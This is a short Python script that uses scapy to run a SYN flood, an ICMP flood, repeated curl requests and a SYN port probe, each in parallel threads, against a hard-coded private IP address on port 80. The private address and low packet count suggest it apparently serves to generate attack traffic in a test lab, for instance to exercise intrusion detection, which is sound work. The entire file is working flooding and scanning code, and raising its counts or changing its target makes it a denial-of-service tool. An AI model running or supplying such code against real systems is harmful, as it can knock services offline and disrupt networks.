import os
import time
import random
import threading
from scapy.all import IP, TCP, ICMP, send, sr1

TARGET_IP = "192.168.50.20"
PORT = 80
PORTS = [80]
PACKET_COUNT = 100
    
def syn_flood():
    try:
        print("Starting SYN flood attack...")
        for _ in range(PACKET_COUNT):
            sport = random.randint(1024, 65535)
            packet = IP(dst=TARGET_IP) / TCP(sport=sport, dport=random.choice(PORTS), flags="S")
            send(packet, verbose=False)
    except Exception as e:
        print(f"Error: {e}")

def http_requests():
    try:
        print("Sending HTTP requests...")
        for _ in range(PACKET_COUNT):
            os.system(f"curl -s http://{TARGET_IP} > /dev/null")
    except Exception as e:
        print(f"Error: {e}")

def icmp_flood():
    try:
        print("Running ICMP flood...")
        for _ in range(PACKET_COUNT):
            packet = IP(dst=TARGET_IP) / ICMP()
            send(packet, verbose=False)
    except Exception as e:
        print(f"Error: {e}")

def nmap_simulation():
    try:
        print("Running simulated Nmap scan...")
        for port in PORTS:
            packet = IP(dst=TARGET_IP) / TCP(dport=port, flags="S")
            send(packet, verbose=False)
            time.sleep(0.5)
    except Exception as e:
        print(f"Error: {e}")

def main():
    threads = [
        threading.Thread(target=syn_flood),
        threading.Thread(target=nmap_simulation),
        threading.Thread(target=http_requests),
        threading.Thread(target=icmp_flood)
    ]

    for t in threads:
        t.start()

    for t in threads:
        t.join()
    
if __name__ == "__main__":
    main()